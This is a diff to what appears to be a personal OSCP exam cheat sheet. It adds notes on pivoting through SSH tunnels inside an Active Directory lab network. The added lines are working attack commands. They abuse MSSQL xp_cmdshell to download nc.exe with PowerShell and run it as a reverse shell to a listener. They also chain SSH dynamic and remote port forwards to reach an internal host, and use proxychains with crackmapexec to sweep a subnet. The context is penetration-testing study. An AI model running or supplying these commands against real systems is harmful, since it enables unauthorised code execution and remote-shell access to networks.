@@ -583,14 +583,34 @@ Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
 hashcat -m <number> hash wordlists.txt --force
 ```
 
-## Pivoting through SSH
+## Pivoting through SSH and Dual SSH tunnel
+- Windows AD MS01 (192.168.193.147 or 10.10.153.147), Internal Network(10.10.153.148), Kali IP(192.168.45.220)
+- I had situation in windows active directory internal network communicated with tunnel Ligolo-NG.
+-  but then get access to the partial shell of the internal network(.148) from here unable to connect the kali(220).
+-  In this situation, I created dynamic port forwarding using ssh.
+-  Port 7777 used for transmitting data from kali(220) to Internal Network(148) through MS01(147)
+-  Same with port 8888 getting shell from Internal Network(148) to kali(220) through MS01(147)
+-  Below shell commands from [MSSQL](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#sql-injection) in that Manual Code Execution.
 
 ```bash
+ssh user@192.168.193.147 -D9090 -R :7777:localhost:7777 -R:8888:localhost:8888
+#python server
+python3 -m http.server 7777 #Kali
+xp_cmdshell powershell -c iwr -uri http://10.10.153.147:7777/nc.exe -Outfile C:\Users\Public\nc.exe #Internal machine
+
+#Reverse shell used port 8888
+xp_cmdshell powershell -c C:\Users\Public\nc.exe 10.10.153.147 8888 -e cmd #Internal machine
+rlwrap nc -nlvp 8888  #Kali
+ #Got shell
+
+
 ssh adminuser@10.10.155.5 -i id_rsa -D 9050 #TOR port
 
 #Change the info in /etc/proxychains4.conf also enable "Quiet Mode"
-
 proxychains4 crackmapexec smb 10.10.10.0/24 #Example
+
+
+
 ```
 
 ## Dealing with Passwords
@@ -1324,9 +1344,13 @@ RECONFIGURE;
 #Now we can run commands
 EXECUTE xp_cmdshell 'whoami';
 
-#After successfully partial command shell observe the commands with syntax both are same caution EXECUTE
+#After successfully partial command shell observe the commands with syntax both are the same caution to use EXECUTE or powershell -c
 EXECUTE xp_cmdshell 'whoami';
-xp_cmdshell powershell -c ls;
+xp_cmdshell powershell -c whoami;
+
+#Download the file
+xp_cmdshell powershell -c iwr -uri http://10.10.153.147:7777/nc.exe -Outfile C:\Users\Public\nc.exe
+xp_cmdshell powershell -c C:\Users\Public\nc.exe 10.10.153.147 8888 -e cmd
 
 
 
